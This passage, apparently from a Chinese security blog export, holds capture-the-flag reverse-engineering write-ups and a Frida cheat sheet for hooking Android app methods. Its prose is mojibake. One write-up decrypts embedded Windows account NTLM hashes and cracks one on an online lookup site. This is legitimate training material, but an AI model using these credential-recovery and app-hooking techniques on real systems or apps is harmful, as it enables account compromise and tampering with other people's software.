45h ; E .rdata:00000001401110B3 db 0 .rdata:00000001401110B4 db 7Ah ; z .rdata:00000001401110B5 db 0 .rdata:00000001401110B6 db 51h ; Q .rdata:00000001401110B7 db 0 .rdata:00000001401110B8 db 32h ; 2 .rdata:00000001401110B9 db 0 .rdata:00000001401110BA db 42h ; B .rdata:00000001401110BB db 0 .rdata:00000001401110BC db 67h ; g .rdata:00000001401110BD db 0 .rdata:00000001401110BE db 2Fh ; / .rdata:00000001401110BF db 0 .rdata:00000001401110C0 db 50h ; P .rdata:00000001401110C1 db 0 .rdata:00000001401110C2 db 54h ; T .rdata:00000001401110C3 db 0 .rdata:00000001401110C4 db 72h ; r .rdata:00000001401110C5 db 0 .rdata:00000001401110C6 db 6Fh ; o .rdata:00000001401110C7 db 0 .rdata:00000001401110C8 db 68h ; h .rdata:00000001401110C9 db 0 .rdata:00000001401110CA db 78h ; x .rdata:00000001401110CB db 0 .rdata:00000001401110CC db 6Ch ; l .rdata:00000001401110CD db 0 .rdata:00000001401110CE db 75h ; u .rdata:00000001401110CF db 0 .rdata:00000001401110D0 db 69h ; i .rdata:00000001401110D1 db 0 .rdata:00000001401110D2 db 4Ah ; J .rdata:00000001401110D3 db 0 .rdata:00000001401110D4 db 43h ; C .rdata:00000001401110D5 db 0 .rdata:00000001401110D6 db 52h ; R .rdata:00000001401110D7 db 0 .rdata:00000001401110D8 db 49h ; I .rdata:00000001401110D9 db 0 .rdata:00000001401110DA db 59h ; Y .rdata:00000001401110DB db 0 .rdata:00000001401110DC db 41h ; A .rdata:00000001401110DD db 0 .rdata:00000001401110DE db 79h ; y .rdata:00000001401110DF db 0 .rdata:00000001401110E0 db 48h ; H .rdata:00000001401110E1 db 0 .rdata:00000001401110E2 db 36h ; 6 .rdata:00000001401110E3 db 0 .rdata:00000001401110E4 db 4Eh ; N .rdata:00000001401110E5 db 0 .rdata:00000001401110E6 db 34h ; 4 .rdata:00000001401110E7 db 0 .rdata:00000001401110E8 db 61h ; a .rdata:00000001401110E9 db 0 .rdata:00000001401110EA db 4Bh ; K .rdata:00000001401110EB db 0 .rdata:00000001401110EC db 4Fh ; O .rdata:00000001401110ED db 0 .rdata:00000001401110EE db 39h ; 9 .rdata:00000001401110EF db 0 .rdata:00000001401110F0 db 0 .rdata:00000001401110F1 db 0 .rdata:00000001401110F2 db 0 .rdata:00000001401110F3 db 0 .rdata:00000001401110F4 db 0 .rdata:00000001401110F5 db 0 .rdata:00000001401110F6 db 0 .rdata:00000001401110F7 db 0 .rdata:00000001401110F8 db 0 .rdata:00000001401110F9 db 0 .rdata:00000001401110FA db 0 .rdata:00000001401110FB db 0 .rdata:00000001401110FC db 0 .rdata:00000001401110FD db 0 .rdata:00000001401110FE db 0 .rdata:00000001401110FF db 0 å¼„å‡ºæ¥ä¸ºd+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg/PTrohxluiJCRIYAyH6N4aKO9\nåœ¨dataæ®µæŠŠä¸Šé¢åŠ å¯†è¿‡ç¨‹ç”¨åˆ°çš„æ•°ç»„å¼„å‡ºæ¥ï¼Œdataæ®µå†…å®¹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 .rdata:0000000140111152 byte_140111152 db 69h ; DATA XREF: sub_140082974:loc_1400829D9â†‘r .rdata:0000000140111153 db 0 .rdata:0000000140111154 db 78h ; x .rdata:0000000140111155 db 0 .rdata:0000000140111156 db 65h ; e .rdata:0000000140111157 db 0 .rdata:0000000140111158 db 64h ; d .rdata:0000000140111159 db 0 .rdata:000000014011115A db 53h ; S .rdata:000000014011115B db 0 .rdata:000000014011115C db 65h ; e .rdata:000000014011115D db 0 .rdata:000000014011115E db 65h ; e .rdata:000000014011115F db 0 .rdata:0000000140111160 db 64h ; d .rdata:0000000140111161 db 0 .rdata:0000000140111162 db 0 .rdata:0000000140111163 db 0 .rdata:0000000140111164 align 8 é€šè¿‡ä¸Šé¢å·²æœ‰çš„ä¿¡æ¯å…ˆå°è¯•è®¡ç®—v6ï¼Œå†™ä¸ªCçš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; int main() { char word_140111152[] = { \u0026#39;i\u0026#39;, 0, \u0026#39;x\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, \u0026#39;S\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, 0, 0}; unsigned short *pass_list = (unsigned short *)word_140111152; int v5, v6, v7, v8; v5 = 70; v8 = 1; v7 = 0; v6 = 0; do { printf(\u0026#34;[DEBUG] Before calculate v6 = %d\\n\u0026#34;, v6); v6 = (int)(v6 + v8 * v5) % 256; v5 = pass_list[v7++]; ++v8; printf(\u0026#34;[DEBUG] After calculate v6 = %d\\n\u0026#34;, v6); } while (v5); printf(\u0026#34;v6 = %d\u0026#34;, v6); } å¾—åˆ°v6ä¸º105\né¢„å…ˆåœ¨èµ›åšå¨å­å®ŒæˆBase64çš„è§£å¯†ï¼Œå¾—åˆ°æ•°æ®æµ\n1 b9 48 1c 58 81 4f 51 7d 27 70 33 6f 79 48 82 21 08 80 79 49 51 52 28 9b 7d bb 40 67 45 7a 96 38 3e 7d 41 42 86 60 4f 6c 3b 87 2e 26 72 51 83 80 79 bd 79 40 67 71 4a a2 98 76 3a 8f 68 da 7f 74 2a 33 55 8d 5e 2b 39 6d be 5f 74 74 7d 11 8e 4b 4d 99 64 79 63 b3 73 ca 31 90 c3 77 1b 6f 61 52 11 bc bd 86 b2 78 4f 7e 56 8f 6c 94 b4 3a 7f 14 4b 79 b6 8c b0 ad 8b 67 6d d1 7a 9a a7 31 74 25 3e 61 2e 82 3d 63 5e 77 6b 7c 3f 24 65 35 9f 53 84 92 42 a0 7d 66 70 3b d3 65 a2 6d 7f 19 92 7a 8c b8 6b 12 18 66 74 c0 48 64 9d 0e 6f 53 96 49 61 5d æ”¾å…¥Cä»£ç ï¼Œå®Œæˆä¸‹é¢çš„éƒ¨åˆ†ï¼Œè¿›è¡Œè§£å¯†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { char word_140111152[] = { \u0026#39;i\u0026#39;, 0, \u0026#39;x\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, \u0026#39;S\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, 0, 0}; unsigned short *pass_list = (unsigned short *)word_140111152; int v5, v6, v7, v8; v5 = 70; v8 = 1; v7 = 0; v6 = 0; do { printf(\u0026#34;[DEBUG] Before calculate v6 = %d\\n\u0026#34;, v6); v6 = (int)(v6 + v8 * v5) % 256; v5 = pass_list[v7++]; ++v8; printf(\u0026#34;[DEBUG] After calculate v6 = %d\\n\u0026#34;, v6); } while (v5); printf(\u0026#34;v6 = %d\\n\u0026#34;, v6); srand(v6); // è®¾ç½®ç§å­ int data[] = {0xb9, 0x48, 0x1c, 0x58, 0x81, 0x4f, 0x51, 0x7d, 0x27, 0x70, 0x33, 0x6f, 0x79, 0x48, 0x82, 0x21, 0x08, 0x80, 0x79, 0x49, 0x51, 0x52, 0x28, 0x9b, 0x7d, 0xbb, 0x40, 0x67, 0x45, 0x7a, 0x96, 0x38, 0x3e, 0x7d, 0x41, 0x42, 0x86, 0x60, 0x4f, 0x6c, 0x3b, 0x87, 0x2e, 0x26, 0x72, 0x51, 0x83, 0x80, 0x79, 0xbd, 0x79, 0x40, 0x67, 0x71, 0x4a, 0xa2, 0x98, 0x76, 0x3a, 0x8f, 0x68, 0xda, 0x7f, 0x74, 0x2a, 0x33, 0x55, 0x8d, 0x5e, 0x2b, 0x39, 0x6d, 0xbe, 0x5f, 0x74, 0x74, 0x7d, 0x11, 0x8e, 0x4b, 0x4d, 0x99, 0x64, 0x79, 0x63, 0xb3, 0x73, 0xca, 0x31, 0x90, 0xc3, 0x77, 0x1b, 0x6f, 0x61, 0x52, 0x11, 0xbc, 0xbd, 0x86, 0xb2, 0x78, 0x4f, 0x7e, 0x56, 0x8f, 0x6c, 0x94, 0xb4, 0x3a, 0x7f, 0x14, 0x4b, 0x79, 0xb6, 0x8c, 0xb0, 0xad, 0x8b, 0x67, 0x6d, 0xd1, 0x7a, 0x9a, 0xa7, 0x31, 0x74, 0x25, 0x3e, 0x61, 0x2e, 0x82, 0x3d, 0x63, 0x5e, 0x77, 0x6b, 0x7c, 0x3f, 0x24, 0x65, 0x35, 0x9f, 0x53, 0x84, 0x92, 0x42, 0xa0, 0x7d, 0x66, 0x70, 0x3b, 0xd3, 0x65, 0xa2, 0x6d, 0x7f, 0x19, 0x92, 0x7a, 0x8c, 0xb8, 0x6b, 0x12, 0x18, 0x66, 0x74, 0xc0, 0x48, 0x64, 0x9d, 0x0e, 0x6f, 0x53, 0x96, 0x49, 0x61, 0x5d}; int new_data[sizeof(data) / sizeof(data[0])] = {0}; printf(\u0026#34;Using v6 = %d to generate random number\u0026#34;, v6); for (int i = 0; i \u0026lt; sizeof(data) / sizeof(data[0]); i++) { int random_number = rand(); new_data[i] = (int)(data[i] - random_number % 128) ^ v6; } for (int i = 0; i \u0026lt; sizeof(data) / sizeof(data[0]); i++) { printf(\u0026#34;%c\u0026#34;, new_data[i]); } } å¾—åˆ°è¾“å‡ºä¸º\n1 2 3 4 5 6 7 8 9 10 User=Administrator NTLM= User=DefaultAccount NTLM= User=Guest NTLM= User=Lihua NTLM=23d1e086b85cc18587bbc8c33adefe07 User=WDAGUtilityAccount NTLM=d3280b38985c05214dcc81b74dd98b4f å–å¾—è´¦æˆ·Lihuaçš„NTLMåŠ å¯†å“ˆå¸Œä¸º23d1e086b85cc18587bbc8c33adefe07ï¼Œæ‰¾ä¸€ä¸ªç½‘ç«™å»è§£å¯†\nMD5 åœ¨ç·šå…è²»è§£å¯† MD5ã€SHA1ã€MySQLã€NTLMã€SHA256ã€SHA512ã€Wordpressã€Bcrypt çš„é›œæ¹Š\nå¾—åˆ°æœ€åçš„ç»“æœä¸ºmemeallme!ï¼Œæ‰€ä»¥flagä¸ºflag{memeallme!}\n","date":"2024-12-15T19:49:19+08:00","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501032016159.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/2024ciscn-writeup%E6%9C%80%E5%A5%BD%E3%81%AE%E4%B8%80%E5%8F%89%E6%A0%91%E4%BD%BF%E7%94%A8%E8%80%85/","title":"2024CISCN Writeup(æœ€å¥½ã®ä¸€å‰æ ‘ä½¿ç”¨è€…)"},{"content":"Frida Hookå®ç°APPå…³é”®ä»£ç å¿«é€Ÿå®šä½(Javaå±‚) HashMapçš„putæ–¹æ³• 1 2 3 4 5 6 7 8 var hashMap = Java.use(\u0026#34;java.util.HashMap\u0026#34;); //è·å–HashMapç±» hashMap.put.implementation = function(a,b){ //hook HashMapçš„putæ–¹æ³• if(a.equals(\u0026#34;username\u0026#34;)){ showStacks(); //æ‰“å°å‡½æ•°è°ƒç”¨æ ˆä¿¡æ¯ console.log(\u0026#34;hashMap.put: \u0026#34;, a, b); } return this.put(a,b); //æ‰§è¡ŒåŸå‡½æ•° } æ‰“å°å‡½æ•°è°ƒç”¨å…³ç³»æ ˆ 1 2 3 4 5 6 7 function showStacks(){ console.log( Java.use(\u0026#34;android.util.Log\u0026#34;).getStackTraceString( //è°ƒç”¨Androidç³»ç»Ÿæä¾›çš„ç±»çš„æ–¹æ³• Java.use(\u0026#34;java.lang.Throwable\u0026#34;).$new() //åˆ›å»ºå¯¹è±¡ ) ); } ArrayListçš„addã€addAllã€setæ–¹æ³•ç­‰ 1 2 3 4 5 6 7 8 9 var arrayList = Java.use(\u0026#34;java.util.ArrayList\u0026#34;); arrayList.add.overload(\u0026#39;java.lang.Object\u0026#39;).implementation = function(a){ //æ–¹æ³•å¦‚æœ‰é‡è½½éœ€æŒ‡å®šä¸ºå…·ä½“çš„é‡è½½æ–¹æ³• if(a.equals(\u0026#34;username = 19002040031\u0026#34;)){ showStacks(); console.log(\u0026#34;arrayList.add: \u0026#34;,a); } //console.log(\u0026#34;arrayList.add: \u0026#34;,a); return this.add(a); } TextUtilsçš„isEmptyæ–¹æ³• 1 2 3 4 5 6 7 8 9 var textUtils = Java.use(\u0026#34;android.text.TextUtils\u0026#34;); textUtils.isEmpty.implementation = function (a) { if(a == \u0026#34;2v+DC2gq7RuAC8PE5GZz5wH3/y9ZVcWhFwhDY9L19g9iEd075+Q7xwewvfIN0g0ec/NaaF43/S0=\u0026#34;){ showStacks(); console.log(\u0026#34;textUtils.isEmpty: \u0026#34;, a); } //console.log(\u0026#34;textUtils.isEmpty: \u0026#34;, a); return this.isEmpty(a); } Log 1 2 3 4 5 6 var log = Java.use(\u0026#34;android.util.Log\u0026#34;); log.w.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.String\u0026#39;).implementation = function (tag, message) { showStacks(); console.log(\u0026#34;log.w: \u0026#34;, tag, message); return this.w(tag, message); } Collectionsçš„sortæ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var collections = Java.use(\u0026#34;java.util.Collections\u0026#34;); //ä¸Šå±‚å‡½æ•° collections.sort.overload(\u0026#39;java.util.List\u0026#39;).implementation = function (a) { showStacks(); var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;collections.sort List: \u0026#34;, result.toString()); return this.sort(a); } //ååº•å±‚çš„sort collections.sort.overload(\u0026#39;java.util.List\u0026#39;, \u0026#39;java.util.Comparator\u0026#39;).implementation = function (a, b) { showStacks(); var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;collections.sort List Comparator: \u0026#34;, result.toString()); return this.sort(a, b); } ///java.util.Arrays sort toString JSONObjectçš„putã€getStringæ–¹æ³•ç­‰(ç°åœ¨æ›´å¤šç”¨GSON) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var jSONObject = Java.use(\u0026#34;org.json.JSONObject\u0026#34;); //putæ–¹æ³• jSONObject.put.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.Object\u0026#39;).implementation = function (a, b) { showStacks(); //var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;jSONObject.put: \u0026#34;, a, b); return this.put(a, b); } //getStringæ–¹æ³• jSONObject.getString.implementation = function (a) { //showStacks(); //var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;jSONObject.getString: \u0026#34;, a); var result = this.getString(a); console.log(\u0026#34;jSONObject.getString result: \u0026#34;, result); return result; } Toastçš„showæ–¹æ³• 1 2 3 4 5 6 var toast = Java.use(\u0026#34;android.widget.Toast\u0026#34;); toast.show.implementation = function(){ showStacks(): console.log(\u0026#34;toast.show: \u0026#34;); return this.show(); } Base64 1 2 3 4 5 6 7 8 9 10 11 12 13 var base64 = Java.use(\u0026#34;android.util.Base64\u0026#34;); base64.encodeToString.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b) { //[Bä¸ºå­—èŠ‚æ•°ç»„ç±»å‹ showStacks(); console.log(\u0026#34;base64.encodeToString: \u0026#34;, JSON.stringify(a)); //æŠŠJSONå¯¹è±¡è§£ææˆæ–‡æœ¬(Strç­‰) var result = this.encodeToString(a, b); console.log(\u0026#34;base64.encodeToString result: \u0026#34;, result) return result; } //java.net.URLEncoder //java.util.Base64 //okio.Base64 //okio.ByteString Stringçš„getBytes,isEmptyæ–¹æ³• 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var str = Java.use(\u0026#34;java.lang.String\u0026#34;); str.getBytes.overload().implementation = function(){ var result = this.getBytes(); var newStr = str.$new(result); console.log(\u0026#34;sre.getBytes result: \u0026#34;,newStr); return result; } str.getBytes.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (a) { showStacks(); var result = this.getBytes(a); var newStr = str.$new(result, a); console.log(\u0026#34;str.getBytes result: \u0026#34;, newStr); return result; } Stringæ„é€ å‡½æ•°çš„Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var stringFactory = Java.use(\u0026#34;java.lang.StringFactory\u0026#34;); //æ³¨æ„è¦HookStringFactoryç±»è€Œä¸æ˜¯Stringç±» stringFactory.newStringFromString.implementation = function (a) { showStacks(); var retval = this.newStringFromString(a); console.log(\u0026#34;stringFactory.newStringFromString: \u0026#34;, retval); return retval; } stringFactory.newStringFromChars.overload(\u0026#39;[C\u0026#39;).implementation = function (a) { showStacks(); var retval = this.newStringFromChars(a); console.log(\u0026#34;stringFactory.newStringFromChars: \u0026#34;, retval); return retval; } //newStringFromBytesã€newStringFromChars //newStringFromStringã€newStringFromStringBufferã€newStringFromStringBuilder StringBuilderã€StringBufferçš„Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var sb = Java.use(\u0026#34;java.lang.StringBuilder\u0026#34;); sb.toString.implementation = function(){ var retval = this.toString(); if(retval.indexOf(\u0026#34;Encrypt\u0026#34;) != -1){ showStacks(); } console.log(\u0026#34;StringBuilder.toString: \u0026#34;, retval); return retval; } var sb = Java.use(\u0026#34;java.lang.StringBuffer\u0026#34;); sb.toString.implementation = function () { var retval = this.toString(); if (retval.indexOf(\u0026#34;username\u0026#34;) != -1) { showStacks(); } console.log(\u0026#34;StringBuffer.toString: \u0026#34;, retval); return retval; } findViewByIdæ‰¾æ§ä»¶id(æ‰“å°R$idçš„å±æ€§)(ä¸å»ºè®®ä¼˜å…ˆä½¿ç”¨) Java.enumerateLoadedClassesSyncæšä¸¾æ‰€æœ‰å·²åŠ è½½çš„ç±»\nå¦‚æœä¸çŸ¥é“ç±»è·¯å¾„ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åè¿‡æ»¤ä¸€ä¸‹ç±»å\nfrida -U -f com.dodonew.online -l HookDemo.js -o log.txt --no-pause\nâ€‹\t-fä»£ç è®©fridaå¸®æˆ‘ä»¬é‡æ–°å¯åŠ¨appï¼Œä¸€å¼€å§‹å°±æ³¨å…¥js\nâ€‹\t--no-pause ç›´æ¥è¿è¡Œä¸»çº¿ç¨‹ï¼Œä¸­é€”ä¸æš‚åœ\nR$id å†…éƒ¨ç±»çš„è®¿é—®\nR$id.btn_login.value ç±»çš„å±æ€§\n1 2 3 4 5 6 7 8 9 10 var btn_login_id = Java.use(\u0026#34;com.dodonew.online.R$id\u0026#34;).btn_login.value; //idä¸ºRçš„å†…éƒ¨ç±»ï¼Œå†™æ³•ç•¥æœ‰ä¸åŒ console.log(\u0026#34;btn_login_id\u0026#34;, btn_login_id); var appCompatActivity = Java.use(\u0026#34;android.support.v7.app.AppCompatActivity\u0026#34;); appCompatActivity.findViewById.implementation = function (a) { if(a == btn_login_id){ showStacks(); console.log(\u0026#34;appCompatActivity.findViewById: \u0026#34;, a); } return this.findViewById(a); } setOnClickListener hookè¿™ä¸ªå‡½æ•°ï¼Œæ¯”å¯¹æ§ä»¶idï¼Œæ‰“å°å‡½æ•°æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 var btn_login_id = Java.use(\u0026#34;com.dodonew.online.R$id\u0026#34;).btn_login.value; console.log(\u0026#34;btn_login_id\u0026#34;, btn_login_id); var view = Java.use(\u0026#34;android.view.View\u0026#34;); view.setOnClickListener.implementation = function (a) { if(this.getId() == btn_login_id){ showStacks(); console.log(\u0026#34;view.id: \u0026#34; + this.getId()); console.log(\u0026#34;view.setOnClickListener is called\u0026#34;); } return this.setOnClickListener(a); } å¿«é€Ÿå®šä½åè®®å¤´åŠ å¯†okhttp3çš„addHeaderæ–¹æ³• 1 2 3 4 5 6 7 8 9 var okhttp_Builder = Java.use(\u0026#39;okhttp3.Request$Builder\u0026#39;); okhttp_Builder.addHeader.implementation = function (a, b) { showStacks(); return this.addHeader(a, b); } Other åŠ å¯†åº“ç›¸å…³çš„hook(è‡ªåç®—æ³•)\nSSLç›¸å…³çš„hook\nsocketç›¸å…³çš„hook\nSocketOutputStream\nSocketInputStream\nè¯»å†™æ–‡ä»¶ç›¸å…³çš„ java.io.File\nè¯ä¹¦åŒå‘éªŒè¯ Keystore.load é€šå¸¸æœ‰è¯ä¹¦å’Œå¯†ç \nå®‰å“é€€å‡ºè¿›ç¨‹çš„æ–¹å¼\n","date":"2024-11-28T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501020013066.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/frida-hook%E5%AE%9E%E7%8E%B0app%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8Djava%E5%B1%82/","title":"Frida Hookå®ç°APPå…³é”®ä»£ç å¿«é€Ÿå®šä½(Javaå±‚)"},{"content":"NewStarCTF Re Week 1 Base64 å…ˆæ”¾IDAä¸­æ‰“å¼€\nå¯ä»¥çœ‹åˆ°å…ˆè®©æˆ‘ä»¬è¾“å…¥äº†flagï¼Œå¾ˆæ˜¾ç„¶strå°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œé•¿åº¦ä¸º112.ä¸‹é¢è¿›è¡Œäº†åˆ¤æ–­ï¼Œè·Ÿä¸€ä¸²å¥‡æ€ªçš„å­—ç¬¦ä¸²è¿›è¡Œäº†åˆ¤æ–­ï¼Œè¿™ä¸²å­—ç¬¦ä¸²å°±æ˜¯åŠ å¯†è¿‡åçš„å¯†æ–‡ã€‚\nä¸‹ä¸€æ­¥çš„æ€è·¯å°±æ˜¯å»çœ‹çœ‹æ˜¯å“ªä¸ªå‡½æ•°å¯¹strè¿›è¡Œæ“ä½œï¼Œåˆ†æåå‘ç°æ˜¯sub_1400014E0å‡½æ•°å¯¹stræ“ä½œï¼Œsub_1400014E0çš„å†…å®¹å¦‚å›¾\nåœ¨é‡Œé¢å¯ä»¥çœ‹åˆ°strä»¥aWhyDo3sthis7abå­—ç¬¦è¡¨ä¸ºåŸºç¡€è¿›è¡Œæ˜ å°„å¾—åˆ°äº†å¯†æ–‡,è·Ÿè¿›å¯ä»¥å¾—åˆ°å­—ç¬¦è¡¨çš„å…·ä½“å†…å®¹WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/\né¡ºä¾¿æŠŠå¯†æ–‡ä¹Ÿè´´å‡ºæ¥g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=\nä¸‹é¢ç»™å‡ºexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import base64 # ç»™å®šçš„å¯†æ–‡å’Œæ˜ å°„è¡¨ cipher_text = \u0026#34;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=\u0026#34; custom_table = \u0026#34;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/\u0026#34; # å°†æ˜ å°„è¡¨è½¬åŒ–ä¸ºæ ‡å‡†Base64å­—ç¬¦è¡¨é¡ºåº standard_table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; # åˆ›å»ºè§£ç è¡¨ï¼šå°†æ˜ å°„è¡¨å­—ç¬¦è½¬æ¢åˆ°æ ‡å‡†Base64å­—ç¬¦ decode_table = str.maketrans(custom_table, standard_table) # ä½¿ç”¨æ˜ å°„è¡¨å¯¹å¯†æ–‡è¿›è¡Œå­—ç¬¦æ›¿æ¢ translated_cipher = cipher_text.translate(decode_table) # è§£ç Base64 decoded_data = base64.b64decode(translated_cipher) print(\u0026#34;è§£ç åçš„æ•°æ®:\u0026#34;, decoded_data) å¾—åˆ°flagï¼šflag{y0u_kn0w_base64_well}\nSimple_encryption é€šè¿‡DIEæŸ¥å£³çŸ¥é“æ— å£³ï¼Œ64ä½æ¶æ„ï¼Œf5è¿›å…¥mainå‡½æ•°\né¦–å…ˆæ˜¯scanfè¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²åˆ°inputï¼ˆå…¶å®å°±æ˜¯ä½ å¾—åˆ°çš„flagï¼‰ï¼Œæ¥ç€forå¾ªç¯å¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œäº†ä¸‰ä¸ªæ“ä½œï¼Œå¾ˆæ˜æ˜¾çœ‹åˆ°æ˜¯å¯¹inputçš„ç¬¬jä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œå½“j%3 = 0,1,2çš„æ—¶å€™ï¼Œè¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¾ªç¯ç»“æŸå°†inputæ•°ç»„ä¸bufferæ•°ç»„è¿›è¡Œæ¯”è¾ƒï¼Œå³å¯†æ–‡ã€‚æå–å‡ºå¯†æ–‡ä¹‹åå³å¯è§£å¯†ï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include\u0026lt;stdio.h\u0026gt; int main() { char buffer[] = { 71,149,52,72,164,28,53,136,100,22,136,7,20,106,57,18,162,10,55,92,7,90,86,96,18,118,37,18,142,40,2 }; for (int i = 0; i \u0026lt; 30; i++ ) { if (!(i % 3)) buffer[i] += 31; if (i % 3 == 1) buffer[i] -= 41; if (i % 3 == 2) buffer[i] ^= 0x55; } printf(\u0026#34;%s\u0026#34;, buffer); return 0; } flag{IT_15_R3Al1y_V3Ry-51Mp1e}\nez_debug å¦‚é¢˜ï¼Œæ˜¾ç„¶æ˜¯å‘Šè¯‰æˆ‘ä»¬è¦é€šè¿‡åŠ¨è°ƒå¾—åˆ°flagï¼Œå…ˆåˆ†æåç¼–è¯‘çš„ä»£ç \nåç¼–è¯‘ä¹‹åèƒ½çœ‹åˆ°è¿™æ˜¯c++ä»£ç ç¼–å†™çš„æ–‡ä»¶ï¼Œè¯»èµ·æ¥éå¸¸åƒåŠ›ï¼Œä½†æ˜¯åœ¨æœ€åä¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸€ä¸ªæ¯”è¾ƒï¼Œè€ƒè™‘åœ¨æ¯”è¾ƒçš„ifè¯­å¥ä½ç½®è®¾ä¸‹æ–­ç‚¹çœ‹èƒ½ä¸èƒ½ç›´æ¥æŸ¥çœ‹åˆ°flagï¼Œç”¨xdbgæ‰“å¼€\nå¯ä»¥çœ‹åˆ°åœ¨rightè¯­å¥æ‰§è¡Œå‰å…ˆå¯¹alè¿›è¡Œäº†åˆ¤æ–­ï¼ˆjeï¼‰ï¼Œå€¼ä¸ºçœŸåˆ™è·³è½¬åˆ°wrongè¯­å¥ã€‚å…³é”®ç‚¹åœ¨äºrightè¯­å¥åé¢æœ‰ä¸ªjmpæ“ä½œï¼ˆæ— æ¡ä»¶è·³è½¬ï¼‰ï¼Œæ„æ€å°±æ˜¯åªè¦æˆ‘ä»¬è¾“å…¥äº†æ­£ç¡®çš„flagï¼Œå°±ä¸€å®šä¼šè·³è½¬åˆ°æŸä¸ªè¯­å¥ï¼Œè€Œè¾“å…¥é”™è¯¯åˆ™ä¸ä¼šè·³è½¬ï¼Œæ¥ç€å¾€è·³è½¬çš„ä½ç½®å¾€ä¸‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸²å­—ç¬¦ä¸²â€œdecrypted flagï¼šâ€ï¼Œæ˜¾ç„¶è¿™ä¸ªrightè·³è½¬çš„è¯­å¥ä¼šæ‰§è¡Œä¸€ç³»åˆ—æ“ä½œå°†è§£å¯†è¿‡åçš„flagæ‰“å°å‡ºæ¥ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œåªéœ€è¦nopæ‰åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„è¯­å¥ï¼Œè®©ç¨‹åºä¸€å®šä¼šæ‰§è¡Œåˆ°rightè¯­å¥ï¼Œæ¥ç€è·³è½¬åˆ°è§£å¯†å‡½æ•°çš„ä½ç½®è®©ç¨‹åºæ¥å¸®æˆ‘ä»¬è§£å¯†å³å¯ã€‚\nå¦‚å›¾ï¼Œnopæ‰åˆ¤æ–­æ“ä½œï¼Œå¹¶åœ¨Decrypted flagçš„ä½ç½®æ‰“æ–­ç‚¹ï¼ˆè§£å¯†ç»“æŸæ‰ä¼šè¿è¡Œåˆ°æ–­ç‚¹å¤„ï¼‰ï¼Œå‰©ä¸‹çš„åªéœ€è¦è¿è¡Œç¨‹åºçŸ¥é“å‘½ä¸­æˆ‘ä»¬çš„æ–­ç‚¹å³å¯ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œå‘½ä¸­æ–­ç‚¹ä¹‹åï¼Œè§£å¯†ä¹‹åçš„flagä¹Ÿæ˜¾ç°å‡ºæ¥äº†flag{y0u_ar3_g0od_@_Debu9}\nWeek 2 UPX DIEæŸ¥å£³ï¼Œå‘ç°æ˜¯upxå£³\nç”¨upxè„±å£³å°±è¡Œäº†ï¼Œå‘½ä»¤ï¼šupx -d yourflie.exe\nè„±å£³åIDAåç¼–è¯‘å³å¯\nf5ä¹‹åå¯ä»¥çœ‹åˆ°è¿›è¡Œäº†RC4åŠ 